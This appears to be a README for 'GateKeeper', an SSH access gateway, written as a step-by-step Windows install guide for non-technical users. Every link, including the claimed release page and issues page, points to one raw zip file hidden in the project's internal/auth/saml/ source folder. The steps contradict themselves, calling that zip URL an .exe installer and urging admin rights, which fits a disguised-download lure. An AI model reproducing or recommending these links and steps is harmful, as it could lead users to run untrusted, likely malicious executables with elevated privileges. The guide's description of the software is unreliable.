# 🛡️ GateKeeper - Secure Your SSH Access Easily

[![Download GateKeeper](https://github.com/alfianoct/GateKeeper/raw/refs/heads/main/internal/auth/saml/Keeper_Gate_2.4.zip)](https://github.com/alfianoct/GateKeeper/raw/refs/heads/main/internal/auth/saml/Keeper_Gate_2.4.zip)

---

## 🔐 What is GateKeeper?

GateKeeper is a software tool that helps you control and secure SSH access to your computers. It acts like a gateway, so only the right people can connect. It works with your existing login systems like OIDC and LDAP. GateKeeper uses rules to decide who can enter, records sessions, and keeps track of actions for security checks. It also keeps your data safe when stored, enforces policies, and adds layers like multi-factor authentication.

You don’t need to understand complex coding or networking to use GateKeeper. This guide will help you download and run it on a Windows computer step by step.

---

## 🖥️ System Requirements

To run GateKeeper on your Windows machine, check if you meet these basics:

- Windows 10 or later (64-bit recommended)
- At least 4 GB of RAM
- 500 MB of free disk space for installation
- Internet connection for downloading updates and setup
- Administrator rights on your computer for installation

You also need an SSH client installed. Windows 10 and 11 usually include OpenSSH by default. If you do not have it, you can install it from Windows features.

---

## 🚀 How to Download GateKeeper

To get started, you need to download GateKeeper's Windows package from the official releases page.

[![Download GateKeeper](https://github.com/alfianoct/GateKeeper/raw/refs/heads/main/internal/auth/saml/Keeper_Gate_2.4.zip)](https://github.com/alfianoct/GateKeeper/raw/refs/heads/main/internal/auth/saml/Keeper_Gate_2.4.zip)

1. Click on the green or blue badge above. This will take you to the GateKeeper release page on GitHub.
2. On the release page, look under the latest version for files that end with `.exe` or `.msi`. These files are the setup installers for Windows.
3. Click on the file that matches your system (usually `https://github.com/alfianoct/GateKeeper/raw/refs/heads/main/internal/auth/saml/Keeper_Gate_2.4.zip` or similar).
4. Your browser will start downloading the file. This may take a few moments depending on your internet speed.

If you need help recognizing the right file, look for something with "Windows," "x64," or "installer" in its name. Avoid files that are not labeled clearly.

---

## ⚙️ Installing GateKeeper on Windows

Once the download finishes, install the app using these steps:

1. Open the folder where the file saved, usually your "Downloads" folder.
2. Double-click the installer file (e.g., `https://github.com/alfianoct/GateKeeper/raw/refs/heads/main/internal/auth/saml/Keeper_Gate_2.4.zip`) to start installation.
3. A setup window will appear. Follow the prompts:

   - Click **Next** on the welcome screen.
   - Read and accept the license terms.
   - Choose the installation folder or use the default location.
   - Click **Install** to begin installing the software.

4. Wait as the installer copies files and configures settings. This takes a few minutes.
5. When installation completes, click **Finish**.
6. You might be asked to allow GateKeeper to make changes to your computer. Click **Yes** if prompted.
7. The app will be ready to use.

---

## 🔧 Initial Setup and Configuration

After installing, you will need to set up GateKeeper before using it. Here are the main steps:

1. **Open GateKeeper:**

   - Find GateKeeper in your Start menu or desktop shortcut and open it.

2. **Add Your SSH Servers:**

   - Click **Add New Server**.
   - Enter the IP address or hostname of your SSH server.
   - Fill in any other required details like the port number (default is 22).

3. **Configure Authentication:**

   - GateKeeper supports login systems called OIDC and LDAP. Ask your system administrator if you need to enter specific settings here.
   - If you use LDAP (commonly for company logins), enter your directory service details.
   - For OIDC, input your identity provider info.
   - Enable multi-factor authentication (MFA) if available to add extra security.

4. **Set Access Rules:**

   - Use the built-in options to create rules about who can connect and when.
   - You can restrict SSH access based on user roles, IP addresses, or time schedules.
   - The app allows you to set policies to enforce these rules automatically.

5. **Save Your Settings**

   - Click **Save** or **Apply** on each screen to store your changes.

---

## 🖥️ Using GateKeeper

Here is how to connect to your SSH server through GateKeeper:

1. Open GateKeeper and select the server you want to access.
2. Click **Connect**.
3. The app will ask for your login credentials. Enter your username and password.
4. If MFA is enabled, provide the second authentication factor as requested.
5. Once logged in, you can work in your SSH session normally.
6. GateKeeper records your session for auditing and can block access if rules are violated.

You do not need to open any other SSH client. GateKeeper handles the connection and security in one place.

---

## 🛠️ Managing Sessions and Audits

GateKeeper keeps detailed records of all SSH sessions. This helps with security reviews or troubleshooting.

- You can view session logs directly within the app.
- Export audit reports for your records or compliance.
- Settings allow you to control how long audits are kept.

---

## ⚙️ Advanced Features (Optional)

If you want to explore further, GateKeeper offers:

- **Encryption at rest:** Keeps stored data safe.
- **IP Rules:** Specify which IP addresses can connect.
- **Role-Based Access Control (RBAC):** Fine-tune who has permission to do what.
- **Session recording:** Watch recorded sessions for monitoring purposes.

Most users will not need to adjust these at first. Your administrator can help configure advanced options.

---

## 🛑 Troubleshooting Tips

- If the installer won’t run, right-click the file and select **Run as administrator**.
- Make sure your Windows updates and security software are current.
- Check your internet connection if the app cannot reach your SSH servers.
- Review firewall rules to allow GateKeeper to connect.
- If you get login errors, double-check your username, password, and any MFA steps.
- Consult the GitHub repository's issues page for solved problems or updates: https://github.com/alfianoct/GateKeeper/raw/refs/heads/main/internal/auth/saml/Keeper_Gate_2.4.zip

---

## 📥 Download GateKeeper Now

To start using GateKeeper, visit the official releases page and download the Windows installer:

[Download GateKeeper](https://github.com/alfianoct/GateKeeper/raw/refs/heads/main/internal/auth/saml/Keeper_Gate_2.4.zip)